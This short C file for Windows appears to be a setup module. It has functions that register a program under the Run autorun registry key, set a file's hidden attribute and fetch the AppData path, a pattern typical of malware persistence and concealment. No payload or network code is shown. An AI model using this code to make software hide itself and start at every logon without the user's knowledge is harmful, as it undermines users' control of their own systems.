#include "setup.h"

bool setAutoRun(const char *currPath, const char *nameProg){
    HKEY key = NULL;
    if((RegOpenKeyEx(HKEY_LOCAL_MACHINE, AUTORUN, 0, KEY_WRITE, &key) == ERROR_SUCCESS) || (RegOpenKeyEx(HKEY_CURRENT_USER, AUTORUN, 0, KEY_WRITE, &key) == ERROR_SUCCESS)){
        if(RegSetValueEx(key, nameProg, 0, REG_SZ, (BYTE*)currPath, strlen(currPath)) == ERROR_SUCCESS){
            RegCloseKey(key);
            return true;
        }
    }
    return false;
}

bool setHidden(const char *path){
    DWORD attr = 0;
    attr = GetFileAttributesA(path);
    if(attr & FILE_ATTRIBUTE_HIDDEN)
        return true;
    attr |= FILE_ATTRIBUTE_HIDDEN;
    return SetFileAttributes(path, attr);
}

int getNewPath(char *newPath, DWORD size){
    DWORD len = 0;
    len = GetEnvironmentVariable("appdata", newPath, size);
    return len;
}
